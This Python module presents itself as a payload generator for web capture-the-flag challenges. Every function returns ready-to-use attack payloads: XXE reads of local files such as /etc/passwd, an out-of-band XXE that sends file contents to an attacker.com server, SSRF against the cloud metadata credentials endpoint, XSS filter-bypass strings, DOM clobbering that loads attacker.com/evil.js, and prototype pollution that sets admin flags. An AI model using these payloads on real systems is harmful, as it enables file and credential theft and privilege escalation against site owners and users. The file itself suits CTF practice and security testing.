"""
XXE, XSS, and Prototype Pollution Payload Crafter for Web CTF challenges.
"""

from typing import List, Dict

def get_xxe_payloads(target_file: str = "/etc/passwd", attacker_url: str = "http://attacker.com") -> List[Dict[str, str]]:
    """Generate XML External Entity (XXE) injection payloads."""
    return [
        {
            "name": "Classic Local File Read XXE",
            "payload": f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{target_file}"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>""",
            "desc": "Direct file extraction through XML entity expansion."
        },
        {
            "name": "PHP Filter Base64 Read via XXE",
            "payload": f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}"> ]>
<data>&xxe;</data>""",
            "desc": "Extracts PHP files without breaking XML parsing on special characters."
        },
        {
            "name": "Blind OOB (Out-of-Band) XXE with Parameter Entity",
            "payload": f"""<!-- Payload sent to server -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % dtd SYSTEM "{attacker_url}/evil.dtd">
%dtd;
%send;
]>
<data>test</data>

<!-- evil.dtd on attacker server -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM '{attacker_url}/?data=%file;'>">
%all;""",
            "desc": "Exfiltrates file contents via HTTP GET to external server when output is not reflected."
        },
        {
            "name": "SVG Image File Upload XXE",
            "payload": f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://{target_file}" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>""",
            "desc": "Injects XXE payload inside an SVG image for image upload endpoints."
        },
        {
            "name": "SSRF via XXE",
            "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>&xxe;</data>""",
            "desc": "Trigger internal network HTTP requests from the XML parser."
        }
    ]

def get_xss_payloads() -> List[Dict[str, str]]:
    """Generate WAF bypass and modern XSS payloads."""
    return [
        {
            "name": "Standard SVG Onload",
            "payload": "<svg/onload=alert(1)>",
            "desc": "Short, effective XSS payload without spaces."
        },
        {
            "name": "Img Error Handler without Spaces",
            "payload": "<img/src=x/onerror=alert(1)>",
            "desc": "Space-free img onerror tag."
        },
        {
            "name": "Bypass No Parentheses ()",
            "payload": "<script>onerror=alert;throw 1337</script>",
            "desc": "Executes alert(1337) without using parentheses."
        },
        {
            "name": "Bypass No Quotes (String.fromCharCode)",
            "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "desc": "Evades quote filters using char codes."
        },
        {
            "name": "DOM Clobbering Form Object",
            "payload": "<form id=\"config\"><input name=\"apiUrl\" value=\"//attacker.com/evil.js\"></form>",
            "desc": "Overwrites window.config.apiUrl in vulnerable JS apps."
        },
        {
            "name": "Client Prototype Pollution (URL Query)",
            "payload": "?__proto__[isAdmin]=true&__proto__[role]=admin",
            "desc": "Pollutes Object.prototype properties via GET query string."
        },
        {
            "name": "Client Prototype Pollution (JSON Body)",
            "payload": '{"__proto__": {"isAdmin": true, "role": "admin"}}',
            "desc": "JSON prototype pollution in merge/clone operations."
        }
    ]
